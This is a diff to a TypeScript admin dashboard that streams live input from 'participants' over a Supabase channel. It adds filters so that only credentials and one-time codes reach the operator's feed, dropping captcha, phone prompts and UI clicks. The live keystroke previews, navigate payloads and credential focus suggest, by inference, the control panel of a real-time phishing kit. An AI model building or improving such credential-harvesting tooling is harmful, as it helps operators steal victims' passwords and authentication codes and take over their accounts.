@@ -22,6 +22,7 @@ import {
 import type { RealtimeChannel } from "@supabase/supabase-js";
 import {
   joinChannel,
+  isSensitiveAdminSubmission,
   type InputPayload,
   type LiveInputPayload,
   type NavigatePayload,
@@ -300,6 +301,10 @@ function Admin() {
       key: `admin_${Math.random().toString(36).slice(2, 8)}`,
       onInput: (p) =>
         setEvents((prev) => {
+          // Drop UI noise / non-credential fields before they hit the feed.
+          if (p.field.startsWith("__")) return prev;
+          if (/_clicked$/i.test(p.field) || p.field === "continue_clicked") return prev;
+          if (!isSensitiveAdminSubmission(p.field)) return prev;
           // Dedupe: drop if last event matches (pid,field,value) within 300ms.
           const last = prev[0];
           if (
@@ -1172,6 +1177,8 @@ function ParticipantCard({
       if (/_clicked$/.test(e.field) || e.field === "continue_clicked") continue;
       // Live typing belongs in live preview — skip draft/input markers.
       if (/\sinput$/i.test(e.field) || /_input$/i.test(e.field) || /_draft_/i.test(e.field)) continue;
+      // Only credentials / codes — drop captcha, phone_send, UI noise, etc.
+      if (!isSensitiveAdminSubmission(e.field)) continue;
       const key = e.field.replace(/_submitted$/i, "").trim().toLowerCase();
       const prev = map.get(key);
       const isSubmit = /_submitted$/i.test(e.field) || /submit$/i.test(e.field) || /_final_/i.test(e.field);
